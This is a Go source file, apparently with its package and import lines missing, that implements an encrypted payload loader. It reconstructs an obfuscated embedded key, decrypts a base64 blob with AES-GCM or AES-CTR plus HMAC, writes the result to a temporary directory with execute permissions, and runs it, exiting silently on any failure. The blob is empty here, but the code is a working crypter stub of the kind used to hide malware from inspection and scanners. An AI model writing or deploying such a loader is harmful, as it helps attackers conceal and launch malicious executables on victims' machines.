const blobB64 = ""

var derivePart1 = []byte{0x43, 0x74, 0xbb, 0x9e, 0xa3, 0xb7, 0x08, 0x62, 0x91, 0x00, 0xe7, 0xff, 0x6d, 0x88, 0xcc, 0x04, 0x5b}
var derivePart2 = []byte{0x20, 0x41, 0xfb, 0x5c, 0x1e, 0x7b, 0x84, 0x51, 0xa9, 0x88, 0x30, 0x86, 0x9f, 0xee, 0xd7, 0x9a, 0x40, 0x05, 0x8a, 0xf6, 0x03, 0xc9, 0xbd}
var derivePart3 = []byte{0xd2, 0x55, 0x72, 0x9c, 0x8c, 0xb6, 0x90, 0xdd, 0x8c, 0x31, 0x4d, 0xb2, 0x25, 0xee, 0x29, 0x95}
var deriveMask  = []byte{0x73, 0x27, 0x9b, 0x1d, 0x48, 0xdc, 0x15, 0xbe, 0x95, 0x35, 0xcc, 0x6f, 0xbf, 0xb2, 0xb8, 0xc3, 0x90, 0xa1, 0xe9, 0xb3, 0x77, 0x2e, 0x1a, 0x70, 0xa3, 0xa8, 0xa8, 0x3d, 0x63, 0xb0, 0x2b, 0xf9}

const (
	magicStr        = "ENCV2"
	version         = byte(1)
	algoAESGCM      = byte(1)
	algoAESCTR_HMAC = byte(2)
	hmacTagLen      = 32
)

type kdfParams struct {
	Iterations uint32
}

type headerMeta struct {
	Algo  byte
	KDF   kdfParams
	Salt  []byte
	Nonce []byte
	Name  string
}

func main() {
	key := deriveKey()
	defer zero(key)

	blob, err := base64.StdEncoding.DecodeString(blobB64)
	if err != nil {
		os.Exit(1)
	}
	defer zero(blob)

	plain, meta, err := decryptBlob(blob, key)
	if err != nil {
		os.Exit(1)
	}
	defer zero(plain)

	if err := executePayload(meta.Name, plain); err != nil {
		os.Exit(1)
	}
}

func deriveKey() []byte {
	seed := append([]byte{}, derivePart1...)
	seed = append(seed, derivePart2...)
	for i := range derivePart3 {
		idx := (i*7 + int(derivePart3[i])) % len(seed)
		seed[idx] ^= derivePart3[len(derivePart3)-1-i]
	}
	sum := sha256.Sum256(seed)
	out := make([]byte, len(sum))
	for i := 0; i < len(out); i++ {
		j := (i*3 + 5) % len(sum)
		out[i] = sum[j] ^ deriveMask[len(deriveMask)-1-i]
	}
	return out[:32]
}

func decryptBlob(blob []byte, pass []byte) ([]byte, headerMeta, error) {
	pos, meta, err := parseHeader(blob)
	if err != nil {
		return nil, meta, err
	}
	header := blob[:pos]
	body := blob[pos:]

	switch meta.Algo {
	case algoAESGCM:
		key := pbkdf2SHA256(pass, meta.Salt, int(meta.KDF.Iterations), 32)
		defer zero(key)

		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, meta, err
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, meta, err
		}
		if len(meta.Nonce) != gcm.NonceSize() {
			return nil, meta, errors.New("invalid nonce length")
		}
		plain, err := gcm.Open(nil, meta.Nonce, body, header)
		if err != nil {
			return nil, meta, errors.New("auth failed")
		}
		return plain, meta, nil

	case algoAESCTR_HMAC:
		if len(body) < hmacTagLen {
			return nil, meta, errors.New("ciphertext too short")
		}
		ciphertext := body[:len(body)-hmacTagLen]
		tag := body[len(body)-hmacTagLen:]

		master := pbkdf2SHA256(pass, meta.Salt, int(meta.KDF.Iterations), 64)
		defer zero(master)
		encKey := master[:32]
		macKey := master[32:]

		mac := hmac.New(sha256.New, macKey)
		mac.Write(header)
		mac.Write(ciphertext)
		expected := mac.Sum(nil)
		if subtleConstantTimeCompare(tag, expected) == 0 {
			return nil, meta, errors.New("auth failed")
		}

		block, err := aes.NewCipher(encKey)
		if err != nil {
			return nil, meta, err
		}
		if len(meta.Nonce) != aes.BlockSize {
			return nil, meta, errors.New("invalid IV length")
		}
		stream := cipher.NewCTR(block, meta.Nonce)
		plain := make([]byte, len(ciphertext))
		stream.XORKeyStream(plain, ciphertext)
		return plain, meta, nil

	default:
		return nil, meta, errors.New("unsupported algorithm")
	}
}

func executePayload(name string, plain []byte) error {
	ext := strings.ToLower(filepath.Ext(name))
	tmpDir, err := os.MkdirTemp("", "encbox-run-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(tmpDir)

	if strings.TrimSpace(name) == "" {
		name = "payload.bin"
	}
	target := filepath.Join(tmpDir, filepath.Base(name))

	mode := os.FileMode(0600)
	if ext == "" && runtime.GOOS != "windows" {
		mode = 0700
	}
	if err := os.WriteFile(target, plain, mode); err != nil {
		return err
	}
	if runtime.GOOS != "windows" && mode&0100 != 0 {
		if err := os.Chmod(target, 0700); err != nil {
			return err
		}
	}

	if ext == ".go" {
		cmd := exec.Command("go", "run", target)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = os.Stdin
		return cmd.Run()
	}

	cmd := exec.Command(target)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	return cmd.Run()
}

func parseHeader(b []byte) (int, headerMeta, error) {
	var m headerMeta
	pos := 0
	if len(b) < len(magicStr)+2 {
		return 0, m, errors.New("invalid data")
	}
	if string(b[:len(magicStr)]) != magicStr {
		return 0, m, errors.New("bad magic")
	}
	pos += len(magicStr)

	if pos >= len(b) {
		return 0, m, errors.New("truncated")
	}
	ver := b[pos]
	pos++
	if ver != version {
		return 0, m, errors.New("unsupported version")
	}

	if pos >= len(b) {
		return 0, m, errors.New("truncated")
	}
	m.Algo = b[pos]
	pos++

	if len(b) < pos+4 {
		return 0, m, errors.New("incomplete header")
	}
	m.KDF.Iterations = readU32(b[pos : pos+4])
	pos += 4

	if len(b) <= pos {
		return 0, m, errors.New("incomplete salt length")
	}
	saltLen := int(b[pos])
	pos++
	if len(b) < pos+saltLen+1 {
		return 0, m, errors.New("incomplete salt")
	}
	m.Salt = b[pos : pos+saltLen]
	pos += saltLen

	if len(b) <= pos {
		return 0, m, errors.New("incomplete nonce length")
	}
	nonceLen := int(b[pos])
	pos++
	if len(b) < pos+nonceLen+2 {
		return 0, m, errors.New("incomplete nonce")
	}
	m.Nonce = b[pos : pos+nonceLen]
	pos += nonceLen

	if len(b) < pos+2 {
		return 0, m, errors.New("missing name length")
	}
	nameLen := int(readU16(b[pos : pos+2]))
	pos += 2
	if len(b) < pos+nameLen {
		return 0, m, errors.New("incomplete name")
	}
	m.Name = string(b[pos : pos+nameLen])
	pos += nameLen

	return pos, m, nil
}

func readU32(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func readU16(b []byte) uint16 {
	return binary.BigEndian.Uint16(b)
}

func pbkdf2SHA256(password, salt []byte, iter int, keyLen int) []byte {
	if iter < 1 {
		iter = 1
	}
	hLen := 32
	blocks := (keyLen + hLen - 1) / hLen
	var out []byte
	for i := 1; i <= blocks; i++ {
		t := pbkdf2F(password, salt, iter, i)
		out = append(out, t...)
	}
	return out[:keyLen]
}

func pbkdf2F(password, salt []byte, iter int, blockIndex int) []byte {
	mac := hmac.New(sha256.New, password)
	var intBuf [4]byte
	binary.BigEndian.PutUint32(intBuf[:], uint32(blockIndex))
	mac.Write(salt)
	mac.Write(intBuf[:])
	u := mac.Sum(nil)
	t := make([]byte, len(u))
	copy(t, u)
	for j := 2; j <= iter; j++ {
		mac = hmac.New(sha256.New, password)
		mac.Write(u)
		u = mac.Sum(nil)
		for k := 0; k < len(t); k++ {
			t[k] ^= u[k]
		}
	}
	return t
}

// constant-time compare returning 1 if equal, 0 if not
func subtleConstantTimeCompare(a, b []byte) int {
	if len(a) != len(b) {
		return 0
	}
	var v byte = 0
	for i := 0; i < len(a); i++ {
		v |= a[i] ^ b[i]
	}
	if v == 0 {
		return 1
	}
	return 0
}

func zero(b []byte) {
	if b == nil {
		return
	}
	for i := range b {
		b[i] = 0
	}
	runtime.KeepAlive(b)
}

